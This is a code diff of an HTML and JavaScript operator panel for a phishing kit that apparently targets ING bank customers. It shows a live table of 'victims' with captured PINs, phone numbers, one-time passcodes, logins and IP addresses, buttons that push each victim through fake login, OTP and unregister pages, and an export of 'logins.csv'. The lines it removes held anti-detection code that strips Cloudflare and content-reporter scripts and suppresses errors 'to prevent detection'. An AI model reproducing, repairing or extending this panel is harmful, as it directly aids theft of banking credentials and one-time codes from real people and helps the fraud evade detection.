@@ -4,12 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
-  <!-- ANTI-DETECTION HEADERS -->
-  <meta http-equiv="X-Content-Type-Options" content="nosniff">
-  <meta http-equiv="X-Frame-Options" content="DENY">
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https://rsms.me; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://rsms.me;">
+  <link rel="preconnect" href="https://rsms.me ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
   <style>
     :root {
       --bg: #000000;
@@ -77,13 +73,6 @@
     .btn-danger:hover{background:rgba(251,113,133,.25)}
     .btn-secondary{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}
 
-    /* Token Section */
-    .token-section{margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1)}
-    .token-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
-    .token-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:8px;padding:12px}
-    .token-type{font-size:10px;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);margin-bottom:4px}
-    .token-value{font-family:monospace;font-size:11px;color:var(--green);word-break:break-all}
-
     /* toast alerts */
     #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
     .alert{background:linear-gradient(135deg,rgba(255,255,255,0.1),rgba(255,255,255,0.05));backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:16px 20px;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:slideIn .3s ease,fadeOut .3s ease 4.7s;display:flex;align-items:center;gap:12px;cursor:pointer;transition:transform .2s ease}
@@ -120,7 +109,7 @@
     <div class="card" style="margin-top:22px">
       <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#60a5fa;text-decoration:none"></a></div>
       <table id="tbl"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Tokens</th><th>Status</th><th>Actions</th>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
     </div>
@@ -146,72 +135,10 @@
   </div>
 
   <script>
-    // ANTI-DETECTION: Block extension script injection immediately
-    (function() {
-      const observer = new MutationObserver((mutations) => {
-        mutations.forEach((m) => {
-          m.addedNodes.forEach((n) => {
-            if (n.tagName === 'SCRIPT') {
-              const src = n.src || '';
-              if (src.includes('cloudflareinsights') || src.includes('webpage_content_reporter')) {
-                console.log('Blocked script:', src);
-                n.remove();
-              }
-            }
-          });
-        });
-      });
-      observer.observe(document.head, { childList: true, subtree: true });
-      observer.observe(document.body, { childList: true, subtree: true });
-      
-      // Suppress specific errors
-      window.onerror = function(msg, url, line) {
-        if (url && (url.includes('webpage_content_reporter') || url.includes('cloudflareinsights'))) {
-          return true; // Suppress
-        }
-        console.warn('Error:', msg);
-        return true; // Suppress all errors to prevent detection
-      };
-    })();
-
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
-
-    /* ----------  TOKEN MANAGEMENT  ---------- */
-    function getLocalToken() {
-      try {
-        let token = localStorage.getItem('ing_panel_local');
-        if (!token) {
-          token = 'local_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
-          localStorage.setItem('ing_panel_local', token);
-        }
-        return token;
-      } catch(e) { return null; }
-    }
-
-    function getSessionToken() {
-      try {
-        let token = sessionStorage.getItem('ing_panel_session');
-        if (!token) {
-          token = 'sess_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
-          sessionStorage.setItem('ing_panel_session', token);
-        }
-        return token;
-      } catch(e) { return null; }
-    }
-
-    function clearTokens() {
-      try {
-        localStorage.removeItem('ing_panel_local');
-        sessionStorage.removeItem('ing_panel_session');
-      } catch(e) {}
-    }
-
-    // Initialize tokens
-    const localToken = getLocalToken();
-    const sessionToken = getSessionToken();
 
     /* ----------  LIVE CLOCK  ---------- */
     function updateClock(){
@@ -247,48 +174,46 @@
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  TOKEN BADGE  ---------- */
-    function tokenBadge(tokens) {
-      if (!tokens) return '—';
-      const hasLocal = tokens.local || tokens.localToken;
-      const hasSession = tokens.session || tokens.sessionToken;
-      if (hasLocal && hasSession) return '<span style="color:var(--green)">●●</span>';
-      if (hasLocal || hasSession) return '<span style="color:var(--yellow)">●</span>';
-      return '—';
-    }
-
-    /* ----------  ACTION BUTTONS (table row)  ---------- */
+    /* ----------  ACTION BUTTONS (table row) - FIXED LOGIC  ---------- */
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
       
+      // Always show view details
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
 
+      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
       if (s.page === 'index.html') {
+        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'verify.html') {
+        // On verify page: show buttons if phone entered
         if (s.phone && s.phone.length > 0) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'unregister.html') {
+        // On unregister page: show continue if clicked, no redo
         if (s.unregisterClicked === true) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'otp.html') {
+        // On OTP page: show buttons if OTP entered
         if (s.otp && s.otp.length > 0) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       }
+      // Note: success page has no buttons (already approved)
       
       return html + '</div>';
     }
 
-    /* ----------  CHANGE DETECTION  ---------- */
+    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
     function checkChanges(newSessions){
+      // Only check for new data entry, not session removal
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -338,7 +263,6 @@
           <td>${s.ip}</td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
-          <td>${tokenBadge(s.tokens)}</td>
           <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
           <td>${actionButtons(s)}</td>
         </tr>`).join('');
@@ -350,13 +274,11 @@
       if(!s)return;
       currentSid = sid;
       
-      const tokens = s.tokens || {};
-      const hasLocal = tokens.local || tokens.localToken;
-      const hasSession = tokens.session || tokens.sessionToken;
-      
+      // Update header
       qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
       qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
+      // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
         s.activityLog.slice().reverse().map(log => `
           <div class="activity-item">
@@ -423,23 +345,6 @@
           </div>
         </div>
         
-        ${(hasLocal || hasSession) ? `
-        <div class="token-section">
-          <div class="activity-title">Browser Tokens</div>
-          <div class="token-grid">
-            ${hasLocal ? `
-            <div class="token-box">
-              <div class="token-type">LocalStorage Token (Persistent)</div>
-              <div class="token-value">${hasLocal}</div>
-            </div>` : ''}
-            ${hasSession ? `
-            <div class="token-box">
-              <div class="token-type">SessionStorage Token (Tab-only)</div>
-              <div class="token-value">${hasSession}</div>
-            </div>` : ''}
-          </div>
-        </div>` : ''}
-        
         <div class="activity-section">
           <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
           <div class="activity-log">${activityHtml}</div>
@@ -468,80 +373,26 @@
 
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
-      try {
-        await fetch('/api/panel',{
-          method:'POST',
-          headers:{
-            'Content-Type':'application/json',
-            'X-Local-Token': localToken || '',
-            'X-Session-Token': sessionToken || ''
-          },
-          body:JSON.stringify({action,sid})
-        });
-        load();
-      } catch(e) {
-        console.error('Action failed:', e);
-      }
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
+      load();
     }
 
-    /* ----------  LOGOUT + EXPORT  ---------- */
+    /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
     qs('#logoutBtn').onclick = async () => {
-      try {
-        await fetch('/panel/logout',{
-          method:'POST',
-          headers:{
-            'X-Local-Token': localToken || '',
-            'X-Session-Token': sessionToken || ''
-          }
-        });
-        clearTokens();
-        location.replace('/panel');
-      } catch(e) {
-        location.reload();
-      }
+      await fetch('/panel/logout',{method:'POST'});
+      location.replace('/panel');
     };
-    
-    qs('#exportBtn').onclick = () => {
-      const link = document.createElement('a');
-      link.href = '/api/export';
-      link.download = 'logins.csv';
-      link.click();
-    };
+    qs('#exportBtn').onclick = () => location.href = '/api/export';
 
-    /* ----------  LONG-POLL WITH TOKENS  ---------- */
+    /* ----------  LONG-POLL  ---------- */
     async function load(){
-      try {
-        const r = await fetch('/api/panel', {
-          headers: {
-            'X-Local-Token': localToken || '',
-            'X-Session-Token': sessionToken || ''
-          }
-        });
-        
-        if (!r.ok) {
-          if (r.status === 401) {
-            clearTokens();
-            return location.replace('/panel');
-          }
-          throw new Error(`HTTP ${r.status}`);
-        }
-        
-        const d = await r.json();
-        if(d.error) {
-          clearTokens();
-          return location.replace('/panel');
-        }
-        
-        jsonData = d;
-        checkChanges(d.sessions);
-        render(d);
-      } catch (e) {
-        console.error('Poll error:', e);
-      }
-      setTimeout(load, 300);
+      const d = await fetch('/api/panel').then(r=>r.json());
+      if(d.error)return location.replace('/panel');
+      jsonData = d;
+      checkChanges(d.sessions);
+      render(d);
+      setTimeout(load,300);
     }
-    
-    // Start polling
     load();
   </script>
 </body>
